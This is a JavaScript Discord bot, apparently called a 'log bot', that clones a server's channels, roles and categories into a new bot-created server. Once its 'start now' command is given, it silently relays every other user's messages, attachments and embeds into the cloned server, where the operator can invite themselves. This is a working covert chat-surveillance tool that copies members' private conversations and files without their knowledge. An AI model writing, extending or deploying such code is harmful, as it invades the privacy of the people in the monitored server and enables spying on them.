const Discord = require("discord.js");
const bot = new Discord.Client();
bot.login("");
const fs = require('fs');
const request = require('request');

async function download(url, filename, channel){
    await request.get(url)
        .on('error', console.error)
        .pipe(fs.createWriteStream('folder/' + filename));
        setTimeout(function(){ bot.channels.fetch(channel).then(channel => channel.send({files: [{attachment: 'some dir here' + filename, name: filename}]})); }, 3000);
}

var cg; 
var og;


bot.on('message', message => {

    if(message.content == "log bot, s"){
        console.log("setting up server...");
        console.log(message.guild.name);
        bot.guilds.create(message.guild.name, {region: 'us-east', icon: message.guild.iconURL()}).then(guild => {
            console.log("created new server! " + guild);
            message.reply("created new server! " + guild.id);
        });

    } 
    else if(message.content.startsWith("log bot, do it")){
        let id = message.content.substr(15);
        message.reply(id);
        bot.guilds.cache.forEach(guild =>{
            if(guild.id == parseInt(id)){
                message.guild.channels.cache.forEach(channel => { 
                    if(channel.type == "text"){
                        guild.channels.create(channel.name, {topic: channel.topic, position: channel.rawPosition, permissionOverwrites: channel.permissionOverwrites}).then(chan => function(){
                            console.log(chan);
                         });
                         console.log('created new channel ' + channel.position);
                    }
                    if(channel.type == "voice"){
                        guild.channels.create(channel.name, {type: 'voice', position: channel.rawPosition, permissionOverwrites: channel.permissionOverwrites}).then(chan => function(){
                            console.log(chan);
                        });
                    }
                });
            
            }
         });
    }
    else if(message.content.startsWith("log bot, r")){
        let id = message.content.substr(11);
        message.reply(id);
        bot.guilds.cache.forEach(guild =>{
            if(guild.id == parseInt(id)){
                message.guild.roles.cache.forEach(role => {
                    guild.roles.create({data: {name: role.name, color: role.color, position: role.position, permissions: role.permissions, mentionable: role.mentionable}});
                    console.log('creted new role ' + role.name);
                });
            }
        });
    }
    else if(message.content.startsWith("log bot, c")){
        let id = message.content.substr(11);
        message.reply(id);
        bot.guilds.cache.forEach(guild =>{
            if(guild.id == parseInt(id)){
                message.guild.channels.cache.forEach(channel => { 
                    if(channel.type == "category"){
                        guild.channels.create(channel.name, {type: 'category', position: channel.rawPosition}).then(chan => function(){
                            console.log(chan);
                        });
                         console.log('created new category ' + channel.position);
                    }
                });
            
            }
         });
    }
    else if(message.content.startsWith("log bot, q")){
        let id = message.content.substr(11);
        message.reply(id);
        bot.guilds.cache.forEach(guild =>{
            if(guild.id == parseInt(id)){
        guild.channels.cache.forEach(channel => {
            if(channel.type == "category"){
                message.guild.channels.cache.forEach(chan => { 
                   // console.log(chan);
                    //if(chan.parent){
                    var pid = message.guild.channels.cache.find(c => c.name == channel.name);
                    if(pid){
                        if(chan.parentID == pid.id){
                            tchannel = guild.channels.cache.find(c => c.name == chan.name && c.type != "category");
                            if(tchannel){
                            tchannel.setParent(channel);
                            console.log("Found! Sorting: " + chan.name + " into category " + channel.name);
                            }
                        }
                    }
                });
                }
        });
    }
    });
    }
    else if(message.content == "log bot, d"){
        message.reply("deleting");
        bot.guilds.cache.forEach(guild =>{
           if(guild.ownerID == 736015299173941309){
              guild.delete();
           }
           console.log(guild);
        });

        
    }
    else if(message.content.startsWith("log bot, invite me")){
        var id = message.content.substr(19);
        bot.guilds.cache.forEach(guild =>{
            if(guild.id == parseInt(id)){
                //for(var i = 0; i < 5; i++){
                    guild.channels.cache.first().createInvite().then(invite => message.reply(`Created an invite with a code of https://discord.gg/${invite.code}`));
            
               // }
            }
        });
    }
    else if(message.content.startsWith("log bot, start now")){
        var id = message.content.substr(19);
        bot.guilds.cache.forEach(guild =>{
            if(guild.id == parseInt(id)){
                cg = guild;
                og = message.guild;
            }
        });
    }
    else{
        if(cg){
            if(message.guild != cg && message.author.id != 736015299173941309){
                var channel = cg.channels.cache.find(channel => channel.name === message.channel.name);
                if(channel){
                    channel = channel.id;
                    bot.channels.fetch(channel).then(channel => channel.send("**" + message.author.username + "**:\n" + message.content));
                    if(message.attachments.first()){//checks if an attachment is sent
                        bot.channels.fetch(channel).then(channel => channel.send("**" + message.author.username + "**:"));
                        download(message.attachments.first().url, message.id.toString() + message.attachments.first().name, channel);
                    }
                    if(message.embeds[0]){
                        //bot.channels.fetch(channel).then(channel => channel.send("**" + message.author.username + "**:"));
                        bot.channels.fetch(channel).then(channel => channel.send({embed: message.embeds[0]}));
                    }
                }
                else{
                   cg.channels.create(message.channel.name);
                }
            }    
        }

    }

});